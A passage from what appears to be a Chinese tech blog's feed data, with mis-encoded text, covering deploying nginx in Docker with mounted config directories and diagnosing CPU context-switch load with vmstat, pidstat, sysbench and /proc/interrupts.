class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># åˆ›å»ºæŒ‚è½½ç›®å½•</span><br><span class="line">mkdir -p /home/nginx/conf</span><br><span class="line">mkdir -p /home/nginx/log</span><br><span class="line">mkdir -p /home/nginx/html</span><br></pre></td></tr></table></figure><p>å®¹å™¨ä¸­çš„nginx.confæ–‡ä»¶å’Œconf.dæ–‡ä»¶å¤¹å¤åˆ¶åˆ°å®¿ä¸»æœº</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"># ç”Ÿæˆå®¹å™¨</span><br><span class="line">docker run --name nginx -p <span class="number">9001</span>:<span class="number">80</span> -d nginx</span><br><span class="line"># å°†å®¹å™¨nginx.confæ–‡ä»¶å¤åˆ¶åˆ°å®¿ä¸»æœº</span><br><span class="line">docker cp nginx:/etc/nginx/nginx.conf /home/nginx/conf/nginx.conf</span><br><span class="line"># å°†å®¹å™¨conf.dæ–‡ä»¶å¤¹ä¸‹å†…å®¹å¤åˆ¶åˆ°å®¿ä¸»æœº</span><br><span class="line">docker cp nginx:/etc/nginx/conf.d /home/nginx/conf/conf.d</span><br><span class="line"># å°†å®¹å™¨ä¸­çš„htmlæ–‡ä»¶å¤¹å¤åˆ¶åˆ°å®¿ä¸»æœº</span><br><span class="line">docker cp nginx:/usr/share/nginx/html /home/nginx/</span><br></pre></td></tr></table></figure><p><img src="https://snowgo.top/medias/medias/Docker%E9%83%A8%E7%BD%B2nginx/1.png"></p><h3 id="åˆ›å»ºNginxå®¹å™¨å¹¶è¿è¡Œ"><a href="#åˆ›å»ºNginxå®¹å™¨å¹¶è¿è¡Œ" class="headerlink" title="åˆ›å»ºNginxå®¹å™¨å¹¶è¿è¡Œ"></a>åˆ›å»ºNginxå®¹å™¨å¹¶è¿è¡Œ</h3><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"># ç›´æ¥æ‰§è¡Œdocker rm nginxæˆ–è€…ä»¥å®¹å™¨idæ–¹å¼å…³é—­å®¹å™¨</span><br><span class="line"># æ‰¾åˆ°nginxå¯¹åº”çš„å®¹å™¨id</span><br><span class="line">docker ps -a</span><br><span class="line"># å…³é—­è¯¥å®¹å™¨</span><br><span class="line">docker stop nginx</span><br><span class="line"># åˆ é™¤è¯¥å®¹å™¨</span><br><span class="line">docker rm nginx</span><br><span class="line"> </span><br><span class="line"># åˆ é™¤æ­£åœ¨è¿è¡Œçš„nginxå®¹å™¨</span><br><span class="line">docker rm -f nginx</span><br><span class="line"></span><br><span class="line">docker run \</span><br><span class="line">-p <span class="number">9002</span>:<span class="number">80</span> \</span><br><span class="line">--name nginx \</span><br><span class="line">-v /home/nginx/conf/nginx.conf:/etc/nginx/nginx.conf \</span><br><span class="line">-v /home/nginx/conf/conf.d:/etc/nginx/conf.d \</span><br><span class="line">-v /home/nginx/log:/<span class="keyword">var</span>/log/nginx \</span><br><span class="line">-v /home/nginx/html:/usr/share/nginx/html \</span><br><span class="line">-d nginx:latest</span><br></pre></td></tr></table></figure><table><thead><tr><th><strong>å‘½ä»¤</strong></th><th>**   æè¿°**</th></tr></thead><tbody><tr><td>â€“name nginx</td><td>å¯åŠ¨å®¹å™¨çš„åå­—</td></tr><tr><td>-d</td><td>åå°è¿è¡Œ</td></tr><tr><td>-p 9002:80</td><td>å°†å®¹å™¨çš„ 9002(åé¢é‚£ä¸ª) ç«¯å£æ˜ å°„åˆ°ä¸»æœºçš„ 80(å‰é¢é‚£ä¸ª) ç«¯å£</td></tr><tr><td>-v /home/nginx/conf/nginx.conf:/etc/nginx/nginx.conf</td><td>æŒ‚è½½nginx.confé…ç½®æ–‡ä»¶</td></tr><tr><td>-v /home/nginx/conf/conf.d:/etc/nginx/conf.d</td><td>æŒ‚è½½nginxé…ç½®æ–‡ä»¶</td></tr><tr><td>-v /home/nginx/log:/var/log/nginx</td><td>æŒ‚è½½nginxæ—¥å¿—æ–‡ä»¶</td></tr><tr><td>-v /home/nginx/html:/usr/share/nginx/html</td><td>æŒ‚è½½nginxå†…å®¹</td></tr><tr><td>nginx:latest</td><td>æœ¬åœ°è¿è¡Œçš„ç‰ˆæœ¬</td></tr><tr><td>\</td><td>shell å‘½ä»¤æ¢è¡Œ</td></tr></tbody></table><p><img src="https://snowgo.top/medias/medias/Docker%E9%83%A8%E7%BD%B2nginx/2.png"><br>å•è¡Œæ¨¡å¼</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run -p <span class="number">9002</span>:<span class="number">80</span> --name nginx -v /home/nginx/conf/nginx.conf:/etc/nginx/nginx.conf -v /home/nginx/conf/conf.d:/etc/nginx/conf.d -v /home/nginx/log:/<span class="keyword">var</span>/log/nginx -v /home/nginx/html:/usr/share/nginx/html -d nginx:latest</span><br></pre></td></tr></table></figure><h3 id="ç»“æœæ£€æµ‹"><a href="#ç»“æœæ£€æµ‹" class="headerlink" title="ç»“æœæ£€æµ‹"></a>ç»“æœæ£€æµ‹</h3><p><img src="https://snowgo.top/medias/medias/Docker%E9%83%A8%E7%BD%B2nginx/3.png"></p><p><img src="https://snowgo.top/medias/medias/Docker%E9%83%A8%E7%BD%B2nginx/4.png"></p><h3 id="ä¿®æ”¹å†…å®¹è¿›è¡Œå±•ç¤º"><a href="#ä¿®æ”¹å†…å®¹è¿›è¡Œå±•ç¤º" class="headerlink" title="ä¿®æ”¹å†…å®¹è¿›è¡Œå±•ç¤º"></a>ä¿®æ”¹å†…å®¹è¿›è¡Œå±•ç¤º</h3><p><img src="https://snowgo.top/medias/medias/Docker%E9%83%A8%E7%BD%B2nginx/5.png"><br>_# é‡å¯å®¹å™¨_docker restart nginx<br><img src="https://snowgo.top/medias/medias/Docker%E9%83%A8%E7%BD%B2nginx/6.png"></p>]]></content>
      
      
      <categories>
          
          <category> é—®é¢˜å’ŒæŠ€å·§ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> linux </tag>
            
            <tag> docker </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>æ’æŸ¥CPUä¸Šä¸‹æ–‡åˆ‡æ¢å¸¦æ¥çš„é—®é¢˜</title>
      <link href="/2022/06/21/%E6%8E%92%E6%9F%A5CPU%E4%B8%8A%E4%B8%8B%E6%96%87%E5%88%87%E6%8D%A2%E5%B8%A6%E6%9D%A5%E7%9A%84%E9%97%AE%E9%A2%98/"/>
      <url>/2022/06/21/%E6%8E%92%E6%9F%A5CPU%E4%B8%8A%E4%B8%8B%E6%96%87%E5%88%87%E6%8D%A2%E5%B8%A6%E6%9D%A5%E7%9A%84%E9%97%AE%E9%A2%98/</url>
      
        <content type="html"><![CDATA[<h2 id="ä¸ºä»€ä¹ˆè¦æ’æŸ¥"><a href="#ä¸ºä»€ä¹ˆè¦æ’æŸ¥" class="headerlink" title="ä¸ºä»€ä¹ˆè¦æ’æŸ¥"></a>ä¸ºä»€ä¹ˆè¦æ’æŸ¥</h2><p>é€šè¿‡ä¸Šä¸€ç¯‡æ–‡ç« æˆ‘ä»¬çŸ¥é“ï¼Œè¿‡å¤šçš„ä¸Šä¸‹æ–‡åˆ‡æ¢ï¼Œä¼šæŠŠ CPU æ—¶é—´æ¶ˆè€—åœ¨å¯„å­˜å™¨ã€å†…æ ¸æ ˆä»¥åŠè™šæ‹Ÿå†…å­˜ç­‰æ•°æ®çš„ä¿å­˜å’Œæ¢å¤ä¸Šï¼Œç¼©çŸ­è¿›ç¨‹çœŸæ­£è¿è¡Œçš„æ—¶é—´ï¼Œæˆäº†ç³»ç»Ÿæ€§èƒ½å¤§å¹…ä¸‹é™çš„ä¸€ä¸ªå…ƒå‡¶ã€‚</p><h2 id="å¦‚ä½•æ’æŸ¥"><a href="#å¦‚ä½•æ’æŸ¥" class="headerlink" title="å¦‚ä½•æ’æŸ¥"></a>å¦‚ä½•æ’æŸ¥</h2><p>vmstat æ˜¯ä¸€ä¸ªå¸¸ç”¨çš„ç³»ç»Ÿæ€§èƒ½åˆ†æå·¥å…·ï¼Œä¸»è¦ç”¨æ¥åˆ†æç³»ç»Ÿçš„å†…å­˜ä½¿ç”¨æƒ…å†µï¼Œä¹Ÿå¸¸ç”¨æ¥åˆ†æ CPU ä¸Šä¸‹æ–‡åˆ‡æ¢å’Œä¸­æ–­çš„æ¬¡æ•°ã€‚<br><img src="https://snowgo.top/medias/medias/%E6%8E%92%E6%9F%A5CPU%E4%B8%8A%E4%B8%8B%E6%96%87%E5%88%87%E6%8D%A2%E5%B8%A6%E6%9D%A5%E7%9A%84%E9%97%AE%E9%A2%98/0.png"><br>å…¶ä¸­ï¼š</p><ul><li>csï¼ˆcontext switchï¼‰æ˜¯æ¯ç§’ä¸Šä¸‹æ–‡åˆ‡æ¢çš„æ¬¡æ•°ã€‚</li><li>inï¼ˆinterruptï¼‰åˆ™æ˜¯æ¯ç§’ä¸­æ–­çš„æ¬¡æ•°ã€‚</li><li>rï¼ˆRunning or Runnableï¼‰æ˜¯å°±ç»ªé˜Ÿåˆ—çš„é•¿åº¦ï¼Œä¹Ÿå°±æ˜¯æ­£åœ¨è¿è¡Œå’Œç­‰å¾… CPU çš„è¿›ç¨‹æ•°ã€‚</li><li>bï¼ˆBlockedï¼‰åˆ™æ˜¯å¤„äºä¸å¯ä¸­æ–­ç¡çœ çŠ¶æ€çš„è¿›ç¨‹æ•°ã€‚</li></ul><p>è¦æƒ³æŸ¥çœ‹æ¯ä¸ªè¿›ç¨‹çš„è¯¦ç»†æƒ…å†µï¼Œå°±éœ€è¦ä½¿ç”¨æˆ‘ä»¬å‰é¢æåˆ°è¿‡çš„ pidstat äº†ã€‚ç»™å®ƒåŠ ä¸Š -w é€‰é¡¹ï¼Œä½ å°±å¯ä»¥æŸ¥çœ‹æ¯ä¸ªè¿›ç¨‹ä¸Šä¸‹æ–‡åˆ‡æ¢çš„æƒ…å†µäº†ã€‚<br><img src="https://snowgo.top/medias/medias/%E6%8E%92%E6%9F%A5CPU%E4%B8%8A%E4%B8%8B%E6%96%87%E5%88%87%E6%8D%A2%E5%B8%A6%E6%9D%A5%E7%9A%84%E9%97%AE%E9%A2%98/1.png"></p><ul><li><strong>cswch</strong> ï¼Œè¡¨ç¤ºæ¯ç§’è‡ªæ„¿ä¸Šä¸‹æ–‡åˆ‡æ¢ï¼ˆvoluntary context switchesï¼‰çš„æ¬¡æ•°ã€‚æ‰€è°“<strong>è‡ªæ„¿ä¸Šä¸‹æ–‡åˆ‡æ¢ï¼Œæ˜¯æŒ‡è¿›ç¨‹æ— æ³•è·å–æ‰€éœ€èµ„æºï¼Œå¯¼è‡´çš„ä¸Šä¸‹æ–‡åˆ‡æ¢</strong>ã€‚æ¯”å¦‚è¯´ï¼Œ I/Oã€å†…å­˜ç­‰ç³»ç»Ÿèµ„æºä¸è¶³æ—¶ï¼Œå°±ä¼šå‘ç”Ÿè‡ªæ„¿ä¸Šä¸‹æ–‡åˆ‡æ¢ã€‚</li><li><strong>nvcswch</strong> ï¼Œè¡¨ç¤ºæ¯ç§’éè‡ªæ„¿ä¸Šä¸‹æ–‡åˆ‡æ¢ï¼ˆnon voluntary context switchesï¼‰çš„æ¬¡æ•°ã€‚è€Œ<strong>éè‡ªæ„¿ä¸Šä¸‹æ–‡åˆ‡æ¢ï¼Œåˆ™æ˜¯æŒ‡è¿›ç¨‹ç”±äºæ—¶é—´ç‰‡å·²åˆ°ç­‰åŸå› ï¼Œè¢«ç³»ç»Ÿå¼ºåˆ¶è°ƒåº¦ï¼Œè¿›è€Œå‘ç”Ÿçš„ä¸Šä¸‹æ–‡åˆ‡æ¢</strong>ã€‚æ¯”å¦‚è¯´ï¼Œå¤§é‡è¿›ç¨‹éƒ½åœ¨äº‰æŠ¢ CPU æ—¶ï¼Œå°±å®¹æ˜“å‘ç”Ÿéè‡ªæ„¿ä¸Šä¸‹æ–‡åˆ‡æ¢ã€‚<h2 id="æ¡ˆä¾‹åˆ†æ"><a href="#æ¡ˆä¾‹åˆ†æ" class="headerlink" title="æ¡ˆä¾‹åˆ†æ"></a>æ¡ˆä¾‹åˆ†æ</h2>é¦–å…ˆå‡†å¤‡ï¼š<br><a href="https://github.com/akopytov/sysbench">sysbench</a><br>sysstat<br>ä»¥ä¸‹å‘½ä»¤éƒ½ä»¥rootç”¨æˆ·è¿è¡Œï¼š<br>å…ˆç”¨ vmstat çœ‹ä¸€ä¸‹ç©ºé—²ç³»ç»Ÿçš„ä¸Šä¸‹æ–‡åˆ‡æ¢æ¬¡æ•°ï¼š<br><img src="https://snowgo.top/medias/medias/%E6%8E%92%E6%9F%A5CPU%E4%B8%8A%E4%B8%8B%E6%96%87%E5%88%87%E6%8D%A2%E5%B8%A6%E6%9D%A5%E7%9A%84%E9%97%AE%E9%A2%98/2.png"><br>é¦–å…ˆï¼Œåœ¨ç¬¬ä¸€ä¸ªç»ˆç«¯é‡Œè¿è¡Œ sysbench ï¼Œæ¨¡æ‹Ÿç³»ç»Ÿå¤šçº¿ç¨‹è°ƒåº¦çš„ç“¶é¢ˆï¼š</li></ul><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#ä»¥ <span class="number">10</span> ä¸ªçº¿ç¨‹è¿è¡Œ <span class="number">5</span> åˆ†é’Ÿçš„åŸºå‡†æµ‹è¯•ï¼Œæ¨¡æ‹Ÿå¤šçº¿ç¨‹åˆ‡æ¢çš„é—®é¢˜</span><br><span class="line">sysbench --threads=<span class="number">10</span> --max-time=<span class="number">300</span> threads run</span><br></pre></td></tr></table></figure><p>_ï¼ˆcentosï¼Œyumè£…çš„sysbenchã€‚æ‰§è¡Œåå¾ˆå¿«å®Œäº‹äº†çš„å¯ä»¥è®¾ç½®ä¸‹max-requestsï¼Œé»˜è®¤max-requestsæ˜¯1wæ‰€ä»¥å¾ˆå¿«å°±ç»“æŸäº†ã€‚<code>_sysbench --num-threads=10 --max-time=300 --max-requests=10000000 --test=threads run_</code><em>ï¼‰</em></p><p>æ¥ç€ï¼Œåœ¨ç¬¬äºŒä¸ªç»ˆç«¯è¿è¡Œ vmstat ï¼Œè§‚å¯Ÿä¸Šä¸‹æ–‡åˆ‡æ¢æƒ…å†µï¼š<br><img src="https://snowgo.top/medias/medias/%E6%8E%92%E6%9F%A5CPU%E4%B8%8A%E4%B8%8B%E6%96%87%E5%88%87%E6%8D%A2%E5%B8%A6%E6%9D%A5%E7%9A%84%E9%97%AE%E9%A2%98/3.png"><br>ä½ åº”è¯¥å¯ä»¥å‘ç°ï¼Œcs åˆ—çš„ä¸Šä¸‹æ–‡åˆ‡æ¢æ¬¡æ•°ä»ä¹‹å‰çš„ 35 éª¤ç„¶ä¸Šå‡åˆ°äº† 139 ä¸‡ã€‚åŒæ—¶ï¼Œæ³¨æ„è§‚å¯Ÿå…¶ä»–å‡ ä¸ªæŒ‡æ ‡ï¼š</p><ul><li>r åˆ—ï¼šå°±ç»ªé˜Ÿåˆ—çš„é•¿åº¦å·²ç»åˆ°äº† 8ï¼Œè¿œè¿œè¶…è¿‡äº†ç³»ç»Ÿ CPU çš„ä¸ªæ•° 2ï¼Œæ‰€ä»¥è‚¯å®šä¼šæœ‰å¤§é‡çš„ CPU ç«äº‰ã€‚</li><li>usï¼ˆuserï¼‰å’Œ syï¼ˆsystemï¼‰åˆ—ï¼šè¿™ä¸¤åˆ—çš„ CPU ä½¿ç”¨ç‡åŠ èµ·æ¥ä¸Šå‡åˆ°äº† 100%ï¼Œå…¶ä¸­ç³»ç»Ÿ CPU ä½¿ç”¨ç‡ï¼Œä¹Ÿå°±æ˜¯ sy åˆ—é«˜è¾¾ 84%ï¼Œè¯´æ˜ CPU ä¸»è¦æ˜¯è¢«å†…æ ¸å ç”¨äº†ã€‚</li><li>in åˆ—ï¼šä¸­æ–­æ¬¡æ•°ä¹Ÿä¸Šå‡åˆ°äº† 1 ä¸‡å·¦å³ï¼Œè¯´æ˜ä¸­æ–­å¤„ç†ä¹Ÿæ˜¯ä¸ªæ½œåœ¨çš„é—®é¢˜ã€‚</li></ul><p>ç»¼åˆè¿™å‡ ä¸ªæŒ‡æ ‡ï¼Œæˆ‘ä»¬å¯ä»¥çŸ¥é“ï¼Œç³»ç»Ÿçš„å°±ç»ªé˜Ÿåˆ—è¿‡é•¿ï¼Œä¹Ÿå°±æ˜¯æ­£åœ¨è¿è¡Œå’Œç­‰å¾… CPU çš„è¿›ç¨‹æ•°è¿‡å¤šï¼Œå¯¼è‡´äº†å¤§é‡çš„ä¸Šä¸‹æ–‡åˆ‡æ¢ï¼Œè€Œä¸Šä¸‹æ–‡åˆ‡æ¢åˆå¯¼è‡´äº†ç³»ç»Ÿ CPU çš„å ç”¨ç‡å‡é«˜ã€‚</p><p>-wt å‚æ•°è¡¨ç¤ºè¾“å‡ºçº¿ç¨‹çš„ä¸Šä¸‹æ–‡åˆ‡æ¢æŒ‡æ ‡ï¼Œä¸åŠ tè¾“å‡ºè¿›ç¨‹ã€‚<br><code>pidstat -wt 1</code><br><img src="https://snowgo.top/medias/medias/%E6%8E%92%E6%9F%A5CPU%E4%B8%8A%E4%B8%8B%E6%96%87%E5%88%87%E6%8D%A2%E5%B8%A6%E6%9D%A5%E7%9A%84%E9%97%AE%E9%A2%98/4.png"><br>å‰é¢åœ¨è§‚å¯Ÿç³»ç»ŸæŒ‡æ ‡æ—¶ï¼Œé™¤äº†ä¸Šä¸‹æ–‡åˆ‡æ¢é¢‘ç‡éª¤ç„¶å‡é«˜ï¼Œä¸­æ–­æ¬¡æ•°ä¹Ÿä¸Šå‡åˆ°äº† 1 ä¸‡ï¼Œç»§ç»­æ’æŸ¥ã€‚<br>proc å®é™…ä¸Šæ˜¯ Linux çš„ä¸€ä¸ªè™šæ‹Ÿæ–‡ä»¶ç³»ç»Ÿï¼Œç”¨äºå†…æ ¸ç©ºé—´ä¸ç”¨æˆ·ç©ºé—´ä¹‹é—´çš„é€šä¿¡ã€‚/proc/interrupts å°±æ˜¯è¿™ç§é€šä¿¡æœºåˆ¶çš„ä¸€éƒ¨åˆ†ï¼Œæä¾›äº†ä¸€ä¸ªåªè¯»çš„ä¸­æ–­ä½¿ç”¨æƒ…å†µã€‚<br><code>watch -d cat /proc/interrupts</code><br><img src="https://snowgo.top/medias/medias/%E6%8E%92%E6%9F%A5CPU%E4%B8%8A%E4%B8%8B%E6%96%87%E5%88%87%E6%8D%A2%E5%B8%A6%E6%9D%A5%E7%9A%84%E9%97%AE%E9%A2%98/5.png"><br>å˜åŒ–é€Ÿåº¦æœ€å¿«çš„æ˜¯<strong>é‡è°ƒåº¦ä¸­æ–­</strong>ï¼ˆRESï¼‰ï¼Œè¿™ä¸ªä¸­æ–­ç±»å‹è¡¨ç¤ºï¼Œå”¤é†’ç©ºé—²çŠ¶æ€çš„ CPU æ¥è°ƒåº¦æ–°çš„ä»»åŠ¡è¿è¡Œã€‚è¿™æ˜¯å¤šå¤„ç†å™¨ç³»ç»Ÿï¼ˆSMPï¼‰ä¸­ï¼Œè°ƒåº¦å™¨ç”¨æ¥åˆ†æ•£ä»»åŠ¡åˆ°ä¸åŒ CPU çš„æœºåˆ¶ï¼Œé€šå¸¸ä¹Ÿè¢«ç§°ä¸º<strong>å¤„ç†å™¨é—´ä¸­æ–­</strong>ï¼ˆInter-Processor Interruptsï¼ŒIPIï¼‰ã€‚<br>æ‰€ä»¥ï¼Œè¿™é‡Œçš„ä¸­æ–­å‡é«˜è¿˜æ˜¯å› ä¸ºè¿‡å¤šä»»åŠ¡çš„è°ƒåº¦é—®é¢˜ï¼Œè·Ÿå‰é¢ä¸Šä¸‹æ–‡åˆ‡æ¢æ¬¡æ•°çš„åˆ†æç»“æœæ˜¯ä¸€è‡´çš„ã€‚</p><h2 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h2><p>æ¯ç§’ä¸Šä¸‹æ–‡åˆ‡æ¢å¤šå°‘æ¬¡æ‰ç®—æ­£å¸¸ï¼Ÿ<br><strong>è¿™ä¸ªæ•°å€¼å…¶å®å–å†³äºç³»ç»Ÿæœ¬èº«çš„ CPU æ€§èƒ½</strong>ã€‚å¦‚æœç³»ç»Ÿçš„ä¸Šä¸‹æ–‡åˆ‡æ¢æ¬¡æ•°æ¯”è¾ƒç¨³å®šï¼Œé‚£ä¹ˆä»æ•°ç™¾åˆ°ä¸€ä¸‡ä»¥å†…ï¼Œéƒ½åº”è¯¥ç®—æ˜¯æ­£å¸¸çš„ã€‚ä½†å½“ä¸Šä¸‹æ–‡åˆ‡æ¢æ¬¡æ•°è¶…è¿‡ä¸€ä¸‡æ¬¡ï¼Œæˆ–è€…åˆ‡æ¢æ¬¡æ•°å‡ºç°æ•°é‡çº§çš„å¢é•¿æ—¶ï¼Œå°±å¾ˆå¯èƒ½å·²ç»å‡ºç°äº†æ€§èƒ½é—®é¢˜ã€‚<br>éœ€è¦æ ¹æ®ä¸Šä¸‹æ–‡åˆ‡æ¢çš„ç±»å‹ï¼Œå†åšå…·ä½“åˆ†æï¼š</p><ul><li>è‡ªæ„¿ä¸Šä¸‹æ–‡åˆ‡æ¢å˜å¤šäº†ï¼Œè¯´æ˜è¿›ç¨‹éƒ½åœ¨ç­‰å¾…èµ„æºï¼Œæœ‰å¯èƒ½å‘ç”Ÿäº† I/O ç­‰å…¶ä»–é—®é¢˜ï¼›</li><li>éè‡ªæ„¿ä¸Šä¸‹æ–‡åˆ‡æ¢å˜å¤šäº†ï¼Œè¯´æ˜è¿›ç¨‹éƒ½åœ¨è¢«å¼ºåˆ¶è°ƒåº¦ï¼Œä¹Ÿå°±æ˜¯éƒ½åœ¨äº‰æŠ¢ CPUï¼Œè¯´æ˜ CPU çš„ç¡®æˆäº†ç“¶é¢ˆï¼›</li><li>ä¸­æ–­æ¬¡æ•°å˜å¤šäº†ï¼Œè¯´æ˜ CPU è¢«ä¸­æ–­å¤„ç†ç¨‹åºå ç”¨ï¼Œè¿˜éœ€è¦é€šè¿‡æŸ¥çœ‹ /proc/interrupts æ–‡ä»¶æ¥åˆ†æå…·ä½“çš„ä¸­æ–­ç±»å‹ã€‚</li></ul><p>å¦å¤–ï¼Œstresså’Œsysbenchä¸¤ä¸ªå·¥å…·åœ¨å‹æµ‹è¿‡ç¨‹ä¸­çš„å¯¹æ¯”å‘ç°ï¼š</p><ol><li>stressåŸºäºå¤šè¿›ç¨‹çš„ï¼Œä¼šforkå¤šä¸ªè¿›ç¨‹ï¼Œå¯¼è‡´è¿›ç¨‹ä¸Šä¸‹æ–‡åˆ‡æ¢ï¼Œå¯¼è‡´uså¼€é”€å¾ˆé«˜ï¼›</li><li>sysbenchåŸºäºå¤šçº¿ç¨‹çš„ï¼Œä¼šåˆ›å»ºå¤šä¸ªçº¿ç¨‹ï¼Œå•ä¸€è¿›ç¨‹åŸºäºå†…æ ¸çº¿ç¨‹åˆ‡æ¢ï¼Œå¯¼è‡´syçš„å†…æ ¸å¼€é”€å¾ˆé«˜ï¼›</li></ol>]]></content>
      
      
      <categories>
          
          <category> é—®é¢˜å’ŒæŠ€å·§ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CPU_ä¸Šä¸‹æ–‡åˆ‡æ¢æ˜¯ä»€ä¹ˆæ„æ€</title>
      <link href="/2022/06/20/CPU_%E4%B8%8A%E4%B8%8B%E6%96%87%E5%88%87%E6%8D%A2%E6%98%AF%E4%BB%80%E4%B9%88%E6%84%8F%E6%80%9D/"/>
      <url>/2022/06/20/CPU_%E4%B8%8A%E4%B8%8B%E6%96%87%E5%88%87%E6%8D%A2%E6%98%AF%E4%BB%80%E4%B9%88%E6%84%8F%E6%80%9D/</url>
      
        <content type="html"><![CDATA[<h2 id="CPUä¸Šä¸‹æ–‡"><a href="#CPUä¸Šä¸‹æ–‡" class="headerlink" title="CPUä¸Šä¸‹æ–‡"></a>CPUä¸Šä¸‹æ–‡</h2><p>CPU å¯„å­˜å™¨ï¼Œæ˜¯ CPU å†…ç½®çš„å®¹é‡å°ã€ä½†é€Ÿåº¦æå¿«çš„å†…å­˜ã€‚è€Œç¨‹åºè®¡æ•°å™¨ï¼Œåˆ™æ˜¯ç”¨æ¥å­˜å‚¨ CPU æ­£åœ¨æ‰§è¡Œçš„æŒ‡ä»¤ä½ç½®ã€æˆ–è€…å³å°†æ‰§è¡Œçš„ä¸‹ä¸€æ¡æŒ‡ä»¤ä½ç½®ã€‚å®ƒä»¬éƒ½æ˜¯ CPU åœ¨è¿è¡Œä»»ä½•ä»»åŠ¡å‰ï¼Œå¿…é¡»çš„ä¾èµ–ç¯å¢ƒï¼Œå› æ­¤ä¹Ÿè¢«å«åš <strong>CPU ä¸Šä¸‹æ–‡</strong>ã€‚<br><img src="https://snowgo.top/medias/medias/CPU_%E4%B8%8A%E4%B8%8B%E6%96%87%E5%88%87%E6%8D%A2%E6%98%AF%E4%BB%80%E4%B9%88%E6%84%8F%E6%80%9D/0.png"><br>CPU ä¸Šä¸‹æ–‡åˆ‡æ¢ï¼Œå°±æ˜¯å…ˆæŠŠå‰ä¸€ä¸ªä»»åŠ¡çš„ CPU ä¸Šä¸‹æ–‡ï¼ˆä¹Ÿå°±æ˜¯ CPU å¯„å­˜å™¨å’Œç¨‹åºè®¡æ•°å™¨ï¼‰ä¿å­˜èµ·æ¥ï¼Œç„¶ååŠ è½½æ–°ä»»åŠ¡çš„ä¸Šä¸‹æ–‡åˆ°è¿™äº›å¯„å­˜å™¨å’Œç¨‹åºè®¡æ•°å™¨ï¼Œæœ€åå†è·³è½¬åˆ°ç¨‹åºè®¡æ•°å™¨æ‰€æŒ‡çš„æ–°ä½ç½®ï¼Œè¿è¡Œæ–°ä»»åŠ¡ã€‚<br>è€Œè¿™äº›ä¿å­˜ä¸‹æ¥çš„ä¸Šä¸‹æ–‡ï¼Œä¼šå­˜å‚¨åœ¨ç³»ç»Ÿå†…æ ¸ä¸­ï¼Œå¹¶åœ¨ä»»åŠ¡é‡æ–°è°ƒåº¦æ‰§è¡Œæ—¶å†æ¬¡åŠ è½½è¿›æ¥ã€‚è¿™æ ·å°±èƒ½ä¿è¯ä»»åŠ¡åŸæ¥çš„çŠ¶æ€ä¸å—å½±å“ï¼Œè®©ä»»åŠ¡çœ‹èµ·æ¥è¿˜æ˜¯è¿ç»­è¿è¡Œã€‚</p><h2 id="è¿›ç¨‹ä¸Šä¸‹æ–‡åˆ‡æ¢"><a href="#è¿›ç¨‹ä¸Šä¸‹æ–‡åˆ‡æ¢" class="headerlink" title="è¿›ç¨‹ä¸Šä¸‹æ–‡åˆ‡æ¢"></a>è¿›ç¨‹ä¸Šä¸‹æ–‡åˆ‡æ¢</h2><p>Linux æŒ‰ç…§ç‰¹æƒç­‰çº§ï¼ŒæŠŠè¿›ç¨‹çš„è¿è¡Œç©ºé—´åˆ†ä¸ºå†…æ ¸ç©ºé—´å’Œç”¨æˆ·ç©ºé—´ï¼Œåˆ†åˆ«å¯¹åº”ç€ä¸‹å›¾ä¸­ï¼Œ CPU ç‰¹æƒç­‰çº§çš„ Ring 0 å’Œ Ring 3ã€‚</p><ul><li>å†…æ ¸ç©ºé—´ï¼ˆRing 0ï¼‰å…·æœ‰æœ€é«˜æƒé™ï¼Œå¯ä»¥ç›´æ¥è®¿é—®æ‰€æœ‰èµ„æºï¼›</li><li>ç”¨æˆ·ç©ºé—´ï¼ˆRing 3ï¼‰åªèƒ½è®¿é—®å—é™èµ„æºï¼Œä¸èƒ½ç›´æ¥è®¿é—®å†…å­˜ç­‰ç¡¬ä»¶è®¾å¤‡ï¼Œå¿…é¡»é€šè¿‡ç³»ç»Ÿè°ƒç”¨é™·å…¥åˆ°å†…æ ¸ä¸­ï¼Œæ‰èƒ½è®¿é—®è¿™äº›ç‰¹æƒèµ„æºã€‚</li></ul><p><img src="https://snowgo.top/medias/medias/CPU_%E4%B8%8A%E4%B8%8B%E6%96%87%E5%88%87%E6%8D%A2%E6%98%AF%E4%BB%80%E4%B9%88%E6%84%8F%E6%80%9D/1.png"><br>æ¢ä¸ªè§’åº¦çœ‹ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œè¿›ç¨‹æ—¢å¯ä»¥åœ¨ç”¨æˆ·ç©ºé—´è¿è¡Œï¼Œåˆå¯ä»¥åœ¨å†…æ ¸ç©ºé—´ä¸­è¿è¡Œã€‚è¿›ç¨‹åœ¨ç”¨æˆ·ç©ºé—´è¿è¡Œæ—¶ï¼Œè¢«ç§°ä¸ºè¿›ç¨‹çš„ç”¨æˆ·æ€ï¼Œè€Œé™·å…¥å†…æ ¸ç©ºé—´çš„æ—¶å€™ï¼Œè¢«ç§°ä¸ºè¿›ç¨‹çš„å†…æ ¸æ€ã€‚<br>ä»ç”¨æˆ·æ€åˆ°å†…æ 